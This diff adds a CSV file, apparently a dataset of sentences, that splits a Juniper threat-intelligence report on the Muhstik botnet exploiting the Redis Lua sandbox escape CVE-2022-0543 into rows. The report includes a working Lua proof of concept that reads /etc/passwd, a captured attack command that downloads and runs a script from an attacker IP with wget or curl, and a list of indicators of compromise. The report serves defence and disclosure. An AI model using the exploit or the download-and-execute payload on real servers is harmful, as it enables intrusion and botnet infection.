@@ -1,0 +1,124 @@
+Number,Content
+"""Sentence 1","muhstik gang targets redis servers
+march 24, 2022 juniper threat labs has uncovered an attack that targets redis servers using a recently disclosed vulnerability, namely cve-2022-0543."
+"""Sentence 2",this vulnerability exists in some redis debian packages.
+"""Sentence 3","the attack started on march 11, 2022 from the same threat actor we’ve seen targeting confluence servers back in september 2021 and the same group targeting log4j back in december."
+"""Sentence 4","the payload used is a variant of muhstik bot that can be used to launch ddos attacks
+
+ 
+
+cve-2022-0543: redis lua sandbox escape and remote code execution
+ 
+
+“redis is a very widely used service for caching, but it’s also used as a message broker."
+"""Sentence 5","clients talk to a redis server over a socket, send commands, and the server changes its state (i.e."
+"""Sentence 6","its in-memory structures), in response to such commands."
+"""Sentence 7","redis embeds the lua programming language as its scripting engine, which is made available through the eval command."
+"""Sentence 8","the lua engine is expected to be sandboxed, i.e., clients can interact with the redis apis from lua, but should not be able to execute arbitrary code on the machine where redis is running.“
+
+– reginaldo silva
+
+in january 2022, reginaldo silva discovered a vulnerability in redis (debian-specific) that allows lua sandbox escape."
+"""Sentence 9",a remote attacker with the ability to execute arbitrary lua scripts could escape the lua sandbox and execute arbitrary code on the host.
+"""Sentence 10",this vulnerability existed because the lua library in some debian/ubuntu packages is provided as a dynamic library (ubuntu bionic and trusty are not affected).
+"""Sentence 11","when the lua interpreter initializes, the “package” variable is automatically populated, and that in turn permitted access to arbitrary lua functionality."
+"""Sentence 12","for instance, we can use “package.loadlib”  to load the modules from “liblua” library, then use this module to execute commands."
+"""Sentence 13",the following is a proof of concept on how to exploit this vulnerability.
+"""Sentence 14","local io_l = package.loadlib(/usr/lib/x86_64-linux-gnu/liblua5.1.so.0, luaopen_io); 
+local io = io_l(); 
+local f = io.popen(cat /etc/passwd, r); 
+local res = f:read(*a); 
+f:close(); 
+return res 
+to demonstrate this attack, we instantiated a vulnerable redis server and launched the above lua scripts using the “eval” command."
+"""Sentence 15","as you can observe from the screenshot below, we are able to achieve code execution by dumping the contents of /etc/passwd."
+"""Sentence 16","proof of concept of executing system commands inside the redis session
+
+payload: muhstik bot 
+
+timeline of attacks on cve-2022-0543
+on march 11, juniper threat labs observed attacks launching this exploit from our telemetry."
+"""Sentence 17",the attack attempts to download “russia.sh” using wget or curl from “106[.]246.224.219”.
+"""Sentence 18",it saves it as “/tmp/russ” and executes it.
+"""Sentence 19","eval 'local io_l = package.loadlib(/usr/lib/x86_64-linux-gnu/liblua5.1.so.0, luaopen_io); 
+local io = io_l(); 
+local f = io.popen((wget -o /tmp/russ http://106[."
+"""Sentence 20",]246.224.219/russia.sh || curl -o /tmp/russ http://106[.
+"""Sentence 21","].246.224.219/russia.sh); 
+chmod 700 /tmp/russ; /tmp/russ, r); 
+local res = f:read(*a); f:close(); return res' 0 
+
+contents of russia.sh
+this script (russia.sh) will further download and execute linux binaries from 160[.]16.58.163."
+"""Sentence 22",these binaries are identified to be variants of muhstik bot.
+"""Sentence 23","this bot connects to an irc server to receive commands which include the following:  
+
+download files  
+shell commands  
+flood attacks  
+ssh brute force 
+
+strings inside muhstik bot indicating its capabilities
+threat actor 
+ 
+
+we mapped the originating ip of these attacks to figure out if these are related to some groups we are tracking."
+"""Sentence 24","we found that the following ips was used in the past to launch attacks: 
+
+170[."
+"""Sentence 25","]210.45.163 
+191[."
+"""Sentence 26","]232.38.25  
+79[."
+"""Sentence 27","]172.212.132  
+for instance, the ip 191.232.38.25 was used in september 2021 to launch attacks on confluence servers exploiting cve-2021-26084."
+"""Sentence 28",we have documented that attack here.
+"""Sentence 29",it’s worth noting that the group is still using the same muhstik bot.
+"""Sentence 30",the same ip was again used in december to launch attacks on apache log4j.
+"""Sentence 31",timeline of observed attacks launched from 191[.
+"""Sentence 32","]232.38.25
+conclusion 
+ we advise those who may be vulnerable to patch their redis service."
+"""Sentence 33",debian and ubuntu have also released security advisories regarding this matter.
+"""Sentence 34","links are below: 
+
+debian advisory 
+ubuntu advisory 
+ 
+
+ 
+
+indicators of compromise 
+ 4817893f8e724cbc5186e17f46d316223b7683dcbc9643e364b5913f8d2a9197  pty1 46389c117c5f41b60e10f965b3674b3b77189b504b0aeb5c2da67adf55a7129f  pty10 95d1fca8bea30d9629fdf05e6ba0fc6195eb0a86f99ea021b17cb8823db9d78b  pty2 7d3855bb09f2f6111d6c71e06e1e6b06dd47b1dade49af0235b220966c2f5be3  pty3 16b4093813e2923e9ee70b888f0d50f972ac607253b00f25e4be44993d263bd2  pty4 28443c0a9bfd8a12c12a2aad3cc97d2e8998a9d8825fcf3643d46012f18713f0  pty5 36a2ac597030f3f3425153f5933adc3ca62259c35f687fde5587b8f5466d7d54  russia.sh
+
+ download ip
+
+106[."
+"""Sentence 35","]246.224.219
+160[."
+"""Sentence 36","]16.58.163
+
+attacker ip 
+
+104[."
+"""Sentence 37","]236.150.159
+170[."
+"""Sentence 38","]210.45.163
+146[."
+"""Sentence 39","]185.136.187
+178[."
+"""Sentence 40","]62.69.4
+191[."
+"""Sentence 41","]232.38.25
+79[."
+"""Sentence 42","]172.212.132
+221[."
+"""Sentence 43","]120.103.253
+
+ 
+
+reference: 
+https://github.com/vulhub/vulhub/tree/master/redis/cve-2022-0543
+https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce
+https://github.com/vulhub/vulhub/tree/master/redis/cve-2022-0543
+by paul kimayong"
